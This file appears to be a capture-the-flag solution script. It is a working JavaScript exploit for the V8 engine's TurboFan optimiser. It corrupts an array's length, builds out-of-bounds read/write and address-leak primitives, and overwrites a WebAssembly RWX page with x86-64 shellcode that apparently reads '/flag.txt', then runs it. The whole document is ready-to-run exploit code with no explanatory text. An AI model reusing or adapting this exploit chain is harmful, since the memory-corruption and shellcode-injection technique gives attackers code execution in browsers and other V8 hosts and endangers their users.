
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);

BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.f_hdw = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.f_ldw = function() {
    float_view[0] = this;
    return int_view[0] & BigInt(2**32-1);
}

Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

function hex(a) {
    return "0x" + a.toString(16);
}

function toLittle(num, buf) {
	return new DataView(buf).getBigUint64(0, false);
}

function print_addr(obj) {
    console.log(hex(obj.f2i()));
}

function pause() {
  for (;;){}
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shellcode = wasm_instance.exports.main;
let isolate = (BigInt(1) << BigInt(32)) - BigInt(1);
let o_tmp = {1: 'A'}

function exploit() {
  // force TurboFan
  try {} finally {}

  var x  = "this is cool".indexOf("leet");
  x = x >> 29; // 0, -1
  x = x * 100; // 0 , -100
  x = x - 1; // -1, -101;
  x = x * 2; // -2, -202
  x = -x; // 2, 202

  if (x > 3) {
    return [undefined, undefined]
  }
  else {
    var corrupted = Array(x);
    corrupted[0] = 1.1;
    var victim = [1.1, 1.1, 1.1, 1.1];
    var victim2 = [o_tmp, o_tmp];
    var victim3 = [1.2, 1.2, 1.2];

    return [corrupted, victim, victim2, victim3];
  }
}

function read(addr) {
  var tmp = corrupted[11];
  tmp = tmp.f2i() & isolate << BigInt(32);
  tmp = tmp | addr;
  corrupted[11] = tmp.i2f();

  return victim[0].f2i();
}

function write(addr, sc) {
  back_l = corrupted[0x31].f2i();
  back_h = corrupted[0x32].f2i();

  var l = ((addr & isolate) << BigInt(32)) | (back_l & isolate);
  var h = (back_h & isolate << BigInt(32)) | (addr >> BigInt(32) & isolate);

  corrupted[0x31] = l.i2f();
  corrupted[0x32] = h.i2f();

  for (let i = 0; i < sc.length; i++) {
    data_view.setUint32(4 * i, sc[i], true);
  }
}

function read32(addr) {
  var val = read(addr);

  return val >> BigInt(32) & isolate;
}

function getaddr(obj) {
  victim2[0] = obj;
  victim2[1] = obj;
  return corrupted[14].f2i() >> BigInt(32) & isolate;
}

for (let i = 0; i < 0x10000; i++) {
  [corrupted, victim, victim2, victim3] = exploit();

  if (!corrupted) {
    continue;
  }

  if (corrupted[5] != undefined && corrupted[5] != 1) {
    break;
  }
}

var arr_buf = new ArrayBuffer(0x100);
var data_view = new DataView(arr_buf);

let wi = getaddr(wasm_instance);

let rwx = read(wi + BigInt(0x60));

var sc = [
  0x905f3eeb,
  0x48909090,
  0x204c031,
  0xff63148,
  0xec816605,
  0x8d480fff,
  0x89482434,
  0xd23148c7,
  0xfffba66,
  0xfc03148,
  0xff314805,
  0x1c78040,
  0x48c28948,
  0x104c031,
  0x8166050f,
  0xc30fffc4,
  0xffffbde8,
  0x6c662fff,
  0x742e6761,
  0x007478,
]

write(rwx, sc);

console.log("done");

shellcode();

// END
